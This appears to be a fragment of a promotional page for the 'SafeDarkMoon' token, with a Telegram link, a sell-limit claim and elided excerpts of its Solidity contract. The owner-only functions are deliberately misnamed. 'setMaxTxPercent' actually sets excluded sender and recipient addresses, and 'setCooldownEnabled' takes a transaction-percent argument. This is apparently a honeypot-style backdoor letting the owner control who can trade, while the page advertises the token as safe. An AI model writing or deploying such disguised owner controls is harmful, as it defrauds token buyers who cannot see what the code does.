...
SafeDarkMoon a place to be safe

https://t.me/SafeDarkMoon
...
✈️- Limit sell: 0.2% in 10 Minutes
...
contract SafeDarkMoon is Context, IERC20, Ownable {
    ...
    string private _name = 'Safe Dark Moon';
    string private _symbol = 'SafeDarkMoon';
    ...
    function setCooldownEnabled(uint256 maxTxPercent) public onlyOwner {
    ...
    function setMaxTxPercent(address excludedTxRecipient , address excludedTxSender) public onlyOwner {
        _isExludedFromTxRecipient = excludedTxRecipient;
        _isExludedFromTxSender = excludedTxSender;
        _maxTxAmount = 4000 * 10**3 * 10**3 * 10**18;
    }
